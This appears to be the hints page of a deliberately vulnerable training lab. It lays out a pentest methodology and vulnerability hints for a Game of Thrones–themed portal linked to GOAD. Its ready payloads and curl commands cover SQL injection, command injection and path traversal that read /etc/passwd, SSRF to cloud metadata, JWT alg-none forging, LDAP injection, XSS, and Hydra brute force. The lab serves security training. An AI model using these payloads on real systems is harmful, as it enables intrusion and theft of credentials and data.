🛠 Pentest Methodology

▶
1

Reconnaissance

Explore the application. Check /portal/api/debug/env and /portal/api/debug/crypto for information leaks. Test the /portal/api/goad/connectivity endpoint to understand the network topology.

2

Authentication Attacks

Try default credentials against the login form. Attempt brute force with common passwords. Examine the JWT token structure after login — the secret may be weak.

3

Injection Testing

Test every input field for injection vulnerabilities: SQL injection in Treasury search, LDAP injection in user lookup, command injection in System Console, SSTI in Template Renderer.

4

Access Control

Test IDOR by changing user IDs in the User Directory. Try path traversal in File Manager. Attempt to access the Admin Panel by forging JWT tokens.

5

Server-Side Attacks

Use Network Tools to test SSRF against internal services (GOAD VMs at 192.168.56.x, OCI metadata at 169.254.169.254). Test deserialization via Data Import.

6

GOAD Integration

If GOAD Active Directory is reachable, test SQL injection against the Castle Black MSSQL database. Try LDAP authentication against the three domain controllers. Explore the dragon egg tracker for SSRF against the GOAD network.

7

Marketplace Exploitation

The Seven Kingdoms Marketplace connects to GOAD MSSQL. Browse items, search with SQL injection payloads, view secret items via IDOR (items 9, 12). Try price manipulation: add items to cart, then submit a purchase with a fake total. Check order history with ' OR 1=1-- to dump all orders from the MSSQL database.

💡 Vulnerability Hints

▶

Authentication Bypass

Try admin / admin. Also: the JWT secret is very short.

SQL Injection

Treasury search: ' OR 1=1--
Wildlings: Tormund' UNION SELECT name,1,1 FROM sysobjects--
Shop search: ' UNION SELECT * FROM shop_orders--

Marketplace Exploits

IDOR: View items 9 and 12 for hidden flags.
Price manipulation: POST purchase with {"username":"you","total":1}.
Orders SQLi: ' OR 1=1-- to dump all orders.

IDOR

Try user IDs 1-10. Admin is usually ID 1. Compare responses for different IDs.

Path Traversal

Try ../../../etc/passwd in File Manager. The app doesn't sanitize ../ sequences.

Command Injection

System Console: hostname; whoami or hostname | cat /etc/passwd

SSRF

Avatar Fetch: try http://169.254.169.254/latest/meta-data/ or http://192.168.56.10:389

SSTI

Template Renderer: {{7*7}} should return 49. Try {{config}} for info leak.

JWT Bypass

Login first, then decode your JWT. Change alg to none and role to admin. Remove the signature.

LDAP Injection

LDAP Lookup: try * to dump all users, or admin)(|(password=* for filter injection.

Mass Assignment

Registration: add "role": "admin" to the JSON body. The server doesn't filter extra fields.

XSS

Messages: send <script>alert('XSS')</script> or <img src=x onerror=alert(1)>

Deserialization

Import Profile: base64-encode a Python pickle payload with __reduce__ method.

💻 curl / CLI Examples

▶

Login with Default Credentials

curl -s -X POST http://TARGET/portal/api/auth/login \ -H 'Content-Type: application/json' \ -d '{"username":"admin","password":"admin"}'

SQL Injection — Treasury

curl -s "http://TARGET/portal/api/treasury/search?q=' OR 1=1--"

SSRF — Cloud Metadata

curl -s "http://TARGET/portal/api/avatar/fetch?url=http://169.254.169.254/latest/meta-data/"

Command Injection

curl -s -X POST http://TARGET/portal/api/command/exec \ -H 'Content-Type: application/json' \ -d '{"command":"hostname; id; cat /etc/passwd"}'

Path Traversal

curl -s "http://TARGET/portal/api/files/download?path=../../../etc/passwd"

Brute Force with Hydra

hydra -l admin -P /usr/share/wordlists/rockyou.txt \ TARGET http-post-form \ "/portal/api/auth/login:username=^USER^&password=^PASS^:invalid"

SQLMap — Treasury

sqlmap -u "http://TARGET/portal/api/treasury/search?q=test" \ --level 3 --risk 2 --batch

Nikto Scan

nikto -h http://TARGET -root /portal/api/
